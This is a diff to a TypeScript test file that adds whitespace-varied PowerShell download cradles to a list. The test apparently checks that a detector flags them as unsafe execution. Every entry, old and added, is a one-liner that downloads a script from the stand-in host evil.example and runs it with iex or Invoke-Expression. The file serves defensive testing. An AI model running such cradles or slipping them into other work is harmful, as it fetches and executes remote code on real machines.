@@ -41,6 +41,12 @@ const CRADLES: Record<string, string> = {
     '(New-Object Net.WebClient).DownloadString("https://evil.example/i.ps1") | iex',
   "iex (New-Object System.Net.WebClient)...":
     'iex (New-Object System.Net.WebClient).DownloadString("https://evil.example/i.ps1")',
+  "iex ( (irm ...) ) whitespace between parens":
+    'iex ( (irm "https://evil.example/i.ps1") )',
+  "Invoke-Expression ( (iwr ...) ) whitespace between parens":
+    'Invoke-Expression ( (iwr "https://evil.example/i.ps1").Content )',
+  "IEX   (  (  irm ...) ) extra whitespace":
+    'IEX   (  (  irm "https://evil.example/i.ps1" )  )',
 };
 
 test("powershell cradles downloading and executing code are unsafe execution", () => {
